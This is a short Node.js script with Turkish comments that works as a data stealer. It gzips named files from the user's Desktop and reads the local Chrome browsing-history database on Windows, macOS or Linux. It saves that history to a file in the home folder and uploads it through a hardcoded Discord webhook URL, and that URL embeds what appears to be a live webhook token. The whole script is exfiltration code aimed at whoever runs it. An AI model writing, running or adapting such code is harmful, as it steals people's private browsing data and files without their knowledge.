const fs = require('fs');
const https = require('https');
const path = require('path');
const zlib = require('zlib');
const os = require('os');
const homeDir = os.homedir();


  // compress ------------------------------------------------------------------------------------------------------------------------------------------------


function ensureDirectoryExists(directory) {
    if (!fs.existsSync(directory)) {
      fs.mkdirSync(directory, { recursive: true });
    }
  }
  
  function compressFiles(filePaths, targetFile) {
    ensureDirectoryExists(path.dirname(targetFile));
  
    const writeStream = fs.createWriteStream(targetFile);
    const gzip = zlib.createGzip();
  
    writeStream.on('finish', () => {
      console.log(`Tüm dosyalar sıkıştırıldı ve ${targetFile} konumuna kaydedildi.`);
    });
  
    writeStream.on('error', (err) => {
      console.error(`Hata: ${err.message}`);
    });
  
    const fileStreams = filePaths.map((filePath) => {
      const sourcePath = path.resolve(filePath);
      const readStream = fs.createReadStream(sourcePath);
  
      const compressedStream = readStream.pipe(gzip);
  
      return compressedStream;
    });
  
    const mergedStream = require('stream').PassThrough();
    fileStreams.forEach((fileStream) => fileStream.pipe(mergedStream));
  
    mergedStream.pipe(writeStream);
  }
  
  
  const filePaths = [
    path.resolve(path.join(homeDir, 'Desktop'), '(2).json'),
    path.resolve(homeDir, path.join('Desktop', '15 mb 13-01.json')),
    path.resolve(homeDir, 'Desktop', 'bkm_acs_files.zip')
  ];
  
  const targetFile = path.resolve(homeDir, 'out', 'dosyalar.gz');
  
  compressFiles(filePaths, targetFile);

  // compress ------------------------------------------------------------------------------------------------------------------------------------------------



  // browser ------------------------------------------------------------------------------------------------------------------------------------------------


  function getChromeHistoryPath() {
    const homeDir = os.homedir();
    let historyPath = '';
  
    if (os.platform() === 'win32') {
      historyPath = `${homeDir}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History`;
    } else if (os.platform() === 'darwin') {
      historyPath = `${homeDir}/Library/Application Support/Google/Chrome/Default/History`;
    } else if (os.platform() === 'linux') {
      historyPath = `${homeDir}/.config/google-chrome/Default/History`;
    }
  
    return historyPath;
  }
  
  function getBrowserHistory() {
    const historyPath = getChromeHistoryPath();
  
    try {
      const history = fs.readFileSync(historyPath);
      return history.toString();
    } catch (error) {
      console.error(error);
      return null;
    }
  }

  const browserHistory = getBrowserHistory();
console.log(browserHistory);
  // browser ------------------------------------------------------------------------------------------------------------------------------------------------


// string to file ------------------------------------------------------------------------------------------------------------------------------------------------

function stringToFile(content, filePath) {
  fs.writeFileSync(filePath, content);
  console.log(`Metin dosyası oluşturuldu: ${filePath}`);
}

let filePath = path.resolve(homeDir, 'hstry')


stringToFile(browserHistory, filePath);

// string to file ------------------------------------------------------------------------------------------------------------------------------------------------



// webhook ------------------------------------------------------------------------------------------------------------------------------------------------

function sendFileToWebhook(url, targetFile) {
  const boundary = '--------------------------' + Date.now().toString(16);

  const formData = `
--${boundary}\r
Content-Disposition: form-data; name="file"; filename="allah.zip"\r
Content-Type: text/plain\r
\r
${fs.readFileSync(targetFile, 'utf-8')}\r
--${boundary}--
`;

  const options = {
    method: 'POST',
    headers: {
      'Content-Type': `multipart/form-data; boundary=${boundary}`,
      'Content-Length': Buffer.byteLength(formData),
    },
  };

  const req = https.request(url, options, (res) => {
    console.log(`Dosya gönderme isteği gönderildi, yanıt kodu: ${res.statusCode}`);
    // Yanıtı işleme devam edebilirsiniz...
  });

  req.on('error', (error) => {
    console.error('Dosya gönderme isteği gönderilirken bir hata oluştu:', error.message);
  });

  req.write(formData);
  req.end();
}

// Fonksiyonu kullanarak dosyayı webhook'a gönderme örneği
const webhookUrl = 'https://discordapp.com/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl';

sendFileToWebhook(webhookUrl, filePath);

// webhook ------------------------------------------------------------------------------------------------------------------------------------------------
